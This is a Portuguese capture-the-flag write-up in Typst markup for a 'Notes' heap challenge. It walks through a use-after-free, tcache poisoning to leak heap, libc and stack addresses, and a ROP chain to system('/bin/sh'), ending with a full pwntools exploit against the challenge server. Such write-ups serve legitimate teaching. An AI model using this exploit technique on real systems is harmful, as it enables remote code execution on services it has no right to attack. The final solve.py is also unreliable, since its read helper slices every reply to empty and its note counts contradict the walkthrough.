#import "styles/config.typ": setup_all

// ---------- Declare IDA variables here ----------
// So it colours them as well
#let local_vars = (
	"savedregs",
)
#let global_vars = (
	"notes",
	"n_notes",
)

// ---------- Define chall details here ----------
// For chall info, zsh and pwndbg
#let user = "dleskow"
#let host = "ganesh"
#let ctf = "Ping"
#let chall = "Notes"
#let path = "/home/" + host + "/" + ctf + "/" + context document.title
// raw_size fixes the size of every code block, cant be overwritten, as long as I know
#show: setup_all.with(user, host, path, local_vars: local_vars, global_vars: global_vars, raw_size: 7pt)

// ---------- Document start ----------
#set document(title: chall)
#title[Write-up: #context document.title]
#align(right)[por #emph(user)]
= Informações do chall
#grid(
	columns: 2,
	align(left)[
		- *Título*:
			#ctf/#chall
		- *Autor*:
			Tavares
		- *Contexto*:
			Cansado do Notepad? O Notepad++ é ainda pior? \
			Anuncio-lhes o melhor aplicativos de notas que você já conheceu! \
			E provavelmente o mais seguro também (segurança ainda em fase de testes)
	],
	align(left)[
		- *Arquivos*:
			- _Notes.zip_
				- _notes_ (ELF)
				- _libc.so.6_
				- _ld-linux-x86-64.so.2_
				- _Dockerfile_
				- _run.sh_
				- _flag.txt_
	]
)

#set heading(numbering: "1.")
  
= Write-Up <write-up>
== Vulnerabilidade
	Começamos vendo o checksec do executável e interagindo com o programa. Abri-lo no IDA é uma opção, mas levaria tempo para entender o que está acontecendo, então mais vale ter uma noção inicial do que ele faz e, então, procurar coisas específicas no IDA (este tipo de pensamento não é válido para malwares, claro).
	
	```pwndbg
	pwndbg> checksec
	File:     /home/ganesh/Ping/Notes/notes
	Arch:     amd64
	RELRO:      Full RELRO
	Stack:      Canary found
	NX:         NX enabled
	PIE:        PIE enabled
	Stripped:   No
	```
	
	Para nossa inconveniência, não há facilitadores óbvios. Vejamos um pouco de sua execução:
	
	```my_zsh
	C:\home\me> ./notes
	0xb60
	Welcome to the incredible notes app v1.3.37
	1) Add note
	2) Edit note
	3) Delete note
	4) Read note
	5) Exit
	```
	
	O programa lida com notas, e possui 4 funções: criar, deletar, ler e editar. Testemos os limites de cada uma. Estou omitindo o menu por simplicidade:
	
	```my_zsh
	> 1 # Criar
	Note content> ganesh
	New note id: 0
	
	> 4 # Ler
	Note id> 0
	Note content: ganesh
	
	> 3 # Deletar
	Note id> 0
	
	> 4 # Ler
	Note id> 0
	Note content: ��c # Caracteres não ASCII
	
	> 2 # Editar
	Note id> 0
	New note content> ganesh
	
	> 4 # Ler
	Note id> 0
	Note content: ganesh
	```
	
	Veja que o programa não remove as notas apagadas, nem verifica sua integridade na hora de lê-las ou editá-las. Temos, portanto, uma vulnerabilidade UAF (Use After Free) disponível, e podemos trabalhar sobre isso.
	
	Uma restrição do problema que merece atenção, mostrada abaixo no IDA, é que a leitura da nota utiliza %s no _printf_, ou seja, nos mostra apenas até o 1º byte nulo:
	
	```ida
	unsigned __int64 __fastcall read_note(unsigned __int8 a1)
	{
	  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
	
	  v2 = __readfsqword(0x28u);
	  if ( a1 < (unsigned __int8)n_notes )
	    printf("Note content: %s\n", *((const char **)&notes + a1));
	  else
	    puts("Invalid note id");
	  return v2 - __readfsqword(0x28u);
	}
	```
	
	Primeira coisa a se fazer é garantir que estamos utilizando a mesma versão da Libc que nos foi fornecida. Para tal, utilizamos o _pwninit_ para criar um executável que utilize a Libc existente na mesma pasta do executável, criando o executável _notes\_patched_, sobre o qual trabalharemos. O cabeçalho padrão do _solve.py_ será aqui omitido, mas está contido na solução completa, na Seção~@sec:solve.
	
	Prontos com uma cópia exata do executável rodando no servido e com a vulnerabilidade em mente, temos o seguinte plano de ação:
	
	+ Vazar endereços da Heap e Libc:
		- Deletar notas e lê-las vaza endereços;

		- A primeira vazará o offset da Heap;

		- A primeira após o enchimento da _tcache_ vazará um endereço da Libc.

	+ Abusar do _malloc_ para obter leitura/escrita arbitrária:
		- Basta sobrescrever os endereços das listas encadeadas e esperar ele alocar onde você pediu;

		- Algum lugar na Libc poderá nos vazar um endereço da stack (geralmente o _environ_, mas não dessa vez);

		- Alocar uma nota nesse lugar e vazar um endereço da stack;

	+ Obter escrita diretamente sobre o endereço de retorno da _main_ e utilizar ROP para obter uma shell.
		- Se temos os endereços da Libc, temos também da _system_ e de alguma string \"/bin/sh\" que esteja lá;

		- Devemos ter um gadget para ajeitarmos os argumentos (rdi) para chamar a _system_;

		- Após fazer o ROP, encerrar o programa para lançar o ataque e ganharmos uma shell.
	
=== Ataque utilizando _pwntools_
	O cabeçalho criando o processo com a versão da Libc já foi criado pelo _pwninit_. Além disso, criamos funções que criam, deletam, leem e editam notas, de forma a deixar o ataque mais compreensível, uma vez que abstrai o \"baixo nível\" de lidar com o menu do programa. Tudo isso será aqui omitido, mas está incluso na Seção~@sec:solve.
	
==== Endereços da Heap e Libc
	Para vazar tais endereços, abusamos da _tcache_.
	
	O último _chunk_ da _tcache_ aponta, como próximo, para o offset da página que está utilizando da Heap, o que nos permite, a partir da leitura da 1ª nota apagada (aka última da lista), vazar esse offset, ou seja, obter o endereço da Heap.
	
	Após o enchimento da _tcache_, os _chunks_ são enviados para a _unsorted bin_, que cria a lista circular. Por algum motivo, é necessário haver mais de 1 elemento nela para vazar um enedereço da Libc, mas isso ocorre no primeiro _chunk_ da _unsorted bin_ assim que há mais de um _chunk_ nela.
	
	O código para vazar os endereços, então, consiste em criar N notas, deletar todas elas e ir lendo o que houver nelas para coletar os endereços vazados. Após coletar os vazamentos, calculam-se os valores de interesse e mostram-se todos os endereços vazados na tela.
	
	```python
	# Leak addresses
	N = 12
	for i in range(N):
	    note_add()
	leaks = []
	for i in range(N):
	    note_rm(i)
	    leak = u64(note_read(i).ljust(8, b'\x00'))
	    leaks.append(leak)
	    print(f'leak {i} = {hex(leak)}')
	xor_key = leaks[0]
	heap_addr = xor_key << 12
	libc_addr = leaks[7] - 0x7fbf46407bb0 + 0x7fbf46220000
	print('Leaks:')
	for i in range(N):
	    if 1 <= i < 7:
	        print(f'Leak {i}: {hex(leaks[i] ^ xor_key)}')
	    else:
	        print(f'Leak {i}: {hex(leaks[i])}')
	print(f'{heap_addr = :#x}')
	print(f'{libc_addr = :#x}')
	```
	
	Detalhes a serem lembrados:
	
	- Uma vez que a _read\_note_ nos retorna o conteúdo com _printf_, que para no primeiro byte nulo, é necessário fazer um _padding_ até 8 bytes para utilizar a função _u64_ (que recebe 8 bytes e os converte para um número; no caso, um endereço de memória);
	
	- A lista encadeada formada pelo _malloc_/_free_ guarda os endereços dos próximos _chunks_ de forma codificada: fazendo um XOR com o offset da heap sem os últimos 3 números hexadecimais (aka sem os últimos 12 bits), que é o próprio valor vazado na leitura da 1ª nota apagada.
	
	Para quem não está familiar com a gambiarra da linha 13 (de substrair e somar um valor esquisito), consiste em um método extremamente eficiente de se obter um offset de algo sem ter que realmente calculá-lo: você abre uma execução no GDB, subtrai o próprio valor vazado e soma o valor que você quer obter. É, essencialmente, o mesmo que substituir o valor que você tem pelo valor que você queria ter. Peguemos, para fins de exemplo, uma execução com os seguintes valores:
	
	```pwndbg
	Leak 7: 0x7f8240d7fbb0
	
	pwndbg> info proc m
	0x00007f8240b98000 0x00007f8240bc0000 0x28000            0x0                r--p  /home/ganesh/Ping/Notes/libc.so.6
	```
	
	Com esses valores, teríamos a seguinte linha:
	
	```python
	libc_addr = leaks[7] - 0x7f8240d7fbb0 + 0x7f8240b98000
	```
	
	que, como o offset entre os dois valores é constante, também funciona da mesma forma.
	
	De qualquer forma, agora já temos os endereços da Heap e Libc. Exemplo em uma execução:
	
	```my_zsh
	heap_addr = 0x56387c60f000
	libc_addr = 0x7f8240b98000
	```
	
==== Abuso do _malloc_ / Endereço da Stack
	Para abusar do _malloc_ para obtermos leitura (usando a _read\_note_) e escrita (usando a _edit\_note_) arbitrárias, basta sobrescrever o ponteiro _forward_ da última nota liberada (lembrando de fazer o XOR necessário) e, então, alocar duas notas com o _malloc_. Duas notas, porque lembre que a _tcache_ é uma lista encadeada e a struct usada pelo _malloc_ possui apenas o ponteiro para o primeiro da lista (aka último _free_). Então o primeiro _malloc_ te devolve o _chunk_ que estava nesse ponteiro e o atualiza pelo _forward_ (que é o endereço que você sobrescreveu) e, então, o segundo _malloc_ te devolve um _chunk_ no lugar onde você realmente queria.
	
	No caso desse chall, queremos vazar um endereço da Stack. Para tal, podemos tentar ler o _environ_, mas veja que ele não possui alinhamento com 16 bytes:
	
	```pwndbg
	pwndbg> p &environ
	$1 = (<data variable, no debug info> *) 0x7f23b8ba0e28 <environ>
	```
	
	o que fará com que o _malloc_ retorne erro, caso tente alocar uma nota aí. E, caso tente alocar 8 bytes antes (para corrigir o alinhamento), o _printf_ não te revelará nada, uma vez que possuirá bytes nulos antes de te printar o endereço da Stack lá contido.
	
	Temos, portanto, que procurar outro lugar para ler um endereço da Stack. Infelizmente, não conheço forma melhor de procurar além de ir lendo a memória até achar algo. Dito isso, algo como abaixo foi feito até se achar algo útil:
	
	```pwndbg
	pwndbg> info proc m
	0x00007f23b8b99000 0x00007f23b8b9b000 0x2000             0x1e6000           rw-p  /home/Notes/libc.so.6 
	
	pwndbg> hexdump 0x00007f223e7c0000 0x5000
	+16e0 0x7f23b8b9a6e0  08 f0 f0 6c fc 7f 00 00  00 00 00 00 00 00 00 00  │...l....│........│
	```
	
	como este acima, que é, visivelmente, um endereço da Stack, uma vez que começa com 0x7ff.
	
	Tendo um endereço onde ler um vazamento da Stack, podemos então utilizar o _malloc_ para lê-lo:
	
	```python
	addr = libc_addr - 0x7f72b4642000 + 0x7f72b482a6e0
	print(f'{addr = :#x}')
	note_edit(6, p64(addr ^ xor_key))
	note_add(b'')
	note_add(b'')
	stack_leak = u64(note_read(10).ljust(8, b'\x00'))
	print(f'{stack_leak = :#x}')
	```
	
	Note que alocamos notas vazias para não sobrescrever o endereço lá contido, uma vez que nosso objetivo era ler seu conteúdo.
	
==== ROP
	Agora, tendo vazado um endereço da Stack, basta fazermos ROP.
	
	Para começar, primeiro descobrimos onde queremos escrever, ou seja, onde é o RBP da _main_. Para tal, vamos no GDB, colocamos um breakpoint e vemos. Primeiro, roda-se o script como está até agora e, no GDB, Ctrl+C para se interromper a execução. No _backtrace_, vê-se:
	
	```pwndbg
	 ► 0   0x7f23b8a41687 None
	   1   0x7f23b8a416ad None
	   2   0x7f23b8ab5ea6 read+22
	   3   0x7f23b8a3c861 _IO_file_underflow+337
	   4   0x7f23b8a3ebeb _IO_default_uflow+43
	   5   0x7f23b8a177ba None
	   6   0x7f23b8a0b30e __isoc23_scanf+174
	   7   0x562cb4658486 get_value+54
	```
	
	Como não vemos a _main_, põe-se um breakpoint no _get\_value_ mesmo e manda continuar (lembre de enviar algum valor para ele ler algo e alcançar o breakpoint):
	
	```pwndbg
	pwndbg> b* get_value+54
	Breakpoint 1 at 0x562cb4658486
	pwndbg> c
	Continuing.

	 ► 0   0x562cb4658486 get_value+54
	   1   0x562cb46585a1 main+208
	   2   0x7f23b89dbca8 None
	   3   0x7f23b89dbd65 __libc_start_main+133
	   4   0x562cb4658121 _start+33
	```
	
	Neste backtrace, vemos o lugar na _main_, onde então colocamos um breakpoint:
	
	```pwndbg
	pwndbg> b* main+208
	Breakpoint 2 at 0x562cb46585a1
	pwndbg> c
	Continuing.
	
	pwndbg> p $rbp
	$2 = (void *) 0x7ffc6cf0eef0
	
	pwndbg> hexdump $rbp
	+0000 0x7ffc6cf0eef0  01 00 00 00 00 00 00 00  a8 bc 9d b8 23 7f 00 00  │........│....#...│
	```
	
	Veja que temos a posição onde queremos escrever. Pela mesma questão de alinhamento do _malloc_ de antes, não podemos escrever diretamente sobre o endereço de retorno, então pedimos por uma nota no próprio RBP e sobrescrevemos o valor do RBP antigo que lá está com qualquer coisa, uma vez que seu valor não é relevante (alterar ele geralmente leva o programa a dar _seg fault_, mas como a chamada da _system_ ocorre antes, a shell aparece antes, e o _seg fault_ só ocorre quando esta shell for fechada e o processo anterior voltar a executar, de forma que não mais nos afeta).
	
	Para fazer o ROP, então, primeiro preparamos para chamar o _malloc_ para obtermos escrita na posição de RBP:
	
	```python
	ret_addr = stack_leak - 0x7ffc5f4eeac8 + 0x7ffc5f4ee9b8 - 0x8 # Alignment
	note_rm(9)
	note_edit(9, p64(ret_addr ^ xor_key))
	```
	
	Então, obtemos os endereços necessários para o ROP na Libc fornecida e com as ferramentas do _pwntools_:
	
	```python
	# Prepare payload
	libc.address = libc_addr
	rop = ROP(libc)
	pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
	sh = next(libc.search(b'/bin/sh\x00'))
	ret = pop_rdi + 0x1
	system = libc.sym['system']
	print(f'{ret_addr = :#x}')
	print(f'{pop_rdi  = :#x}')
	print(f'{sh       = :#x}')
	print(f'{ret      = :#x}')
	print(f'{system   = :#x}')
	```
	
	Note que, para alinhamento da Stack (necessário para utilizar a _system_, que requer alinhamento da Stack em 16 bytes), simplesmente colocamos um _ret_ a mais no ROP, o que consiste em um _pop_ a mais, que realinha a Stack. Além disso, por simplicidade, utilizamos o mesmo _ret_ de nosso gadget _pop rdi, ret_ e, como a instrução _pop rdi_ ocupa apenas 1 bytes, basta somar 1 em seu endereço para obter apenas a instrução _ret_.
	
	Com os valores prontos, preparamos o ROP:
	
	```python
	# Payload
	payload = b''
	payload += p64(0x1) # rbp, which wasn't skipped for alignment
	payload += p64(pop_rdi)
	payload += p64(sh)
	payload += p64(ret)
	payload += p64(system)
	```
	
	Agora, com todos a postos, basta desencadear o payload: pegar a nota em RBP através do _malloc_, colocar o _payload_ lá e encerrar o programa, que chama _return 0_ e desencadeia o ROP:
	
	```python
	# Send
	note_add(b'')
	note_add(b'')
	note_edit(12, payload)
	
	# Exit notes = ret
	p.sendline(b'5')
	
	p.interactive()
	```
	
	Dessa forma, deves ganhar uma shell em mãos, de forma a termos encerrado este chall =D
	
= solve.py <sec:solve>
	```python
	from pwn import *
	
	exe  = ELF("../notes_patched")
	libc = ELF("../libc.so.6", checksec=False)
	ld   = ELF("../ld-linux-x86-64.so.2", checksec=False)
	
	REMOTE = False
	REMOTE = True
	
	if REMOTE:
	    context.bits = 64
	    p = remote('ganesh.icmc.usp.br', 5005)
	    #p = remote('localhost', 5005)
	else:
	    context.binary = exe
	    context.terminal = ['qterminal', '-e']
	    p = process([exe.path])
	    #gdb.attach(p, exe=exe.path, gdbscript="b* main+413\ncontinue")
	    gdb.attach(p, exe=exe.path, gdbscript="continue")
	
	#context.log_level = 'debug'
	
	def note_add(data=b'a'):
	    p.sendline(b'1')
	    p.recvuntil(b'> ')
	    p.sendline(data)
	    p.recvuntil(b'> ')
	
	def note_rm(index):
	    p.sendline(b'3')
	    p.recvuntil(b'> ')
	    p.sendline(f'{index}'.encode())
	    p.recvuntil(b'> ')
	
	def note_edit(index, data):
	    p.sendline(b'2')
	    p.recvuntil(b'> ')
	    p.sendline(f'{index}'.encode())
	    p.recvuntil(b'> ')
	    p.sendline(data)
	    p.recvuntil(b'> ')
	
	def note_read(index):
	    p.sendline(b'4')
	    p.recvuntil(b'> ')
	    p.sendline(f'{index}'.encode())
	    p.recvuntil(b': ')
	    leak = p.recvline()[:0]
	    p.recvuntil(b'> ')
	    return leak
	
	p.recvuntil(b'> ')
	
	# Leak addresses
	N = 9
	for i in range(N):
	    note_add()
	leaks = []
	for i in range(N):
	    note_rm(i)
	    leak = u64(note_read(i).ljust(8, b'\x00'))
	    leaks.append(leak)
	    print(f'leak {i} = {hex(leak)}')
	# p.interactive()
	xor_key = leaks[0]
	heap_addr = xor_key << 12
	libc_addr = leaks[7] - 0x7fbf46407bb0 + 0x7fbf46220000
	print('Leaks:')
	for i in range(N):
	    if 1 <= i < 7:
	        print(f'Leak {i}: {hex(leaks[i] ^ xor_key)}')
	    else:
	        print(f'Leak {i}: {hex(leaks[i])}')
	print(f'{heap_addr = :#x}')
	print(f'{libc_addr = :#x}')
	# p.interactive()
	
	# Malloc on the libc and leak stack
	# environ cannot be used because of alignment...
	# pwndbg> hexdump 0x7fe7a72bd000 0x20000
	addr = libc_addr - 0x7f72b4642000 + 0x7f72b482a6e0
	print(f'{addr = :#x}')
	note_edit(6, p64(addr ^ xor_key))
	note_add(b'')
	note_add(b'')
	stack_leak = u64(note_read(10).ljust(8, b'\x00'))
	print(f'{stack_leak = :#x}')
	
	# Get a note that overwrites the return address :D
	ret_addr = stack_leak - 0x7ffc5f4eeac8 + 0x7ffc5f4ee9b8 - 0x8 # Alignment
	note_rm(9)
	note_edit(9, p64(ret_addr ^ xor_key))
	# Prepare payload
	libc.address = libc_addr
	rop = ROP(libc)
	pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
	sh = next(libc.search(b'/bin/sh\x00'))
	ret = pop_rdi + 0x1
	system = libc.sym['system']
	print(f'{ret_addr = :#x}')
	print(f'{pop_rdi  = :#x}')
	print(f'{sh       = :#x}')
	print(f'{ret      = :#x}')
	print(f'{system   = :#x}')
	# Payload
	payload = b''
	payload += p64(0x1) # rbp, which wasn't skipped for alignment
	payload += p64(pop_rdi)
	payload += p64(sh)
	payload += p64(ret)
	payload += p64(system)
	# Send
	note_add(b'')
	note_add(b'')
	note_edit(12, payload)
	
	# Exit notes = ret
	p.sendline(b'5')
	
	p.interactive()
	```
